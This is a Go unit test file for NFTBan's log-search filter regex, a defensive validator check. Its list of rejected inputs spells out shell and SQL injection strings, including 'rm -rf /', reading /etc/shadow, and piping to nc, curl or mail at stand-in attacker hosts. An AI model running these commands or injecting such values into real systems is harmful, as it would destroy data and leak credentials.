// =============================================================================
// NFTBan - Log Handlers Tests
// =============================================================================
// SPDX-License-Identifier: MPL-2.0
// meta:name="handlers_logs_test"
// meta:type="package"
// meta:version="1.0.0"
// meta:owner="Antonios Voulvoulis <contact@nftban.com>"
// meta:created_date="2026-02-06"
// meta:description="Tests for log search filter validation security fixes"
// meta:input="None"
// meta:output="None"
// meta:depends="testing"
// meta:inventory.files=""
// meta:inventory.binaries=""
// meta:inventory.env_vars=""
// meta:inventory.config_files=""
// meta:inventory.systemd_units=""
// meta:inventory.network=""
// meta:inventory.privileges="none"
// =============================================================================

package api

import "testing"

// =============================================================================
// SEARCH FILTER VALIDATION TESTS
// =============================================================================

// TestValidSearchFilterRegex_ValidInputs tests that legitimate search strings pass validation
func TestValidSearchFilterRegex_ValidInputs(t *testing.T) {
	valid := []string{
		"error",
		"192.168.1.1",
		"test_log",
		"info:debug",
		"INFO",
		"2026-02-06",
		"nftban.service",
		"192.168.0.0",
		"10.0.0.1",
		"WARNING",
		"user-login",
		"test.log",
		"BANNED IP",
		"scan detected from 192.168.1.100",
		"firewall:rule:added",
		"nftban_portscan",
		"2026-02-06 12:30:45",
	}

	for _, s := range valid {
		t.Run(s, func(t *testing.T) {
			if !validSearchFilterRegex.MatchString(s) {
				t.Errorf("Expected %q to be valid, but it was rejected", s)
			}
		})
	}
}

// TestValidSearchFilterRegex_InvalidInputs tests that command injection attempts are blocked
func TestValidSearchFilterRegex_InvalidInputs(t *testing.T) {
	invalid := []string{
		// Shell command injection attempts
		"'; rm -rf /",
		"$(whoami)",
		"|cat /etc/passwd",
		"&& ls",
		"`id`",
		"; drop table users;",
		"| nc attacker.com 1234",
		"$(/bin/bash)",
		"$(cat /etc/shadow)",
		// Backtick injection
		"`curl http://evil.com`",
		// Semicolon injection
		"error; rm -rf /",
		// Pipe injection
		"log | mail attacker@evil.com",
		// Background process injection
		"search & wget http://malware.com",
		// Subshell injection
		"test $(id)",
		"test `id`",
		// Quotes that could break out
		"test' OR '1'='1",
		"test\" OR \"1\"=\"1",
		// Redirect injection
		"log > /etc/passwd",
		"log < /etc/passwd",
		// Parentheses
		"(rm -rf /)",
		// Curly braces
		"{echo,hello}",
		// Square brackets (glob patterns that could be abused)
		"[test]",
		// Backslash escape
		"test\\ninjected",
	}

	for _, s := range invalid {
		t.Run(s, func(t *testing.T) {
			if validSearchFilterRegex.MatchString(s) {
				t.Errorf("Expected %q to be invalid (potential injection), but it was accepted", s)
			}
		})
	}
}

// TestValidSearchFilterRegex_EdgeCases tests boundary conditions
func TestValidSearchFilterRegex_EdgeCases(t *testing.T) {
	testCases := []struct {
		name    string
		input   string
		isValid bool
	}{
		{"empty string", "", false},
		{"single character", "a", true},
		{"single digit", "1", true},
		{"single underscore", "_", true},
		{"single hyphen", "-", true},
		{"single dot", ".", true},
		{"single colon", ":", true},
		{"single space", " ", true},
		{"only spaces", "   ", true},
		{"leading space", " error", true},
		{"trailing space", "error ", true},
		{"tab character", "error\ttest", false}, // tabs are not allowed
		{"newline character", "error\ntest", false},
		{"null character", "error\x00test", false},
		{"unicode character", "error\u0100", false}, // extended unicode not allowed
		{"very long valid string", "abcdefghijklmnopqrstuvwxyz0123456789", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := validSearchFilterRegex.MatchString(tc.input)
			if result != tc.isValid {
				t.Errorf("Input %q: expected valid=%v, got valid=%v", tc.input, tc.isValid, result)
			}
		})
	}
}

// TestValidSearchFilterRegex_RealWorldSearches tests realistic search terms
func TestValidSearchFilterRegex_RealWorldSearches(t *testing.T) {
	// These are examples of what users might actually search for in logs
	realSearches := []string{
		"BANNED",
		"UNBANNED",
		"portscan",
		"ddos",
		"192.168.1.1",
		"10.0.0.0",
		"2001:db8::1", // Note: square brackets would fail, but this IPv6 is ok
		"ERROR",
		"WARNING",
		"INFO",
		"DEBUG",
		"nftban",
		"suricata",
		"rule added",
		"connection refused",
		"timeout",
		"failed login",
		"SSH",
		"HTTP",
		"port 22",
		"port 443",
	}

	for _, s := range realSearches {
		t.Run(s, func(t *testing.T) {
			if !validSearchFilterRegex.MatchString(s) {
				t.Errorf("Real-world search term %q was unexpectedly rejected", s)
			}
		})
	}
}

// =============================================================================
// BENCHMARKS
// =============================================================================

func BenchmarkValidSearchFilterRegex_Valid(b *testing.B) {
	testInput := "192.168.1.1 error log message"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validSearchFilterRegex.MatchString(testInput)
	}
}

func BenchmarkValidSearchFilterRegex_Invalid(b *testing.B) {
	testInput := "'; rm -rf /"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validSearchFilterRegex.MatchString(testInput)
	}
}
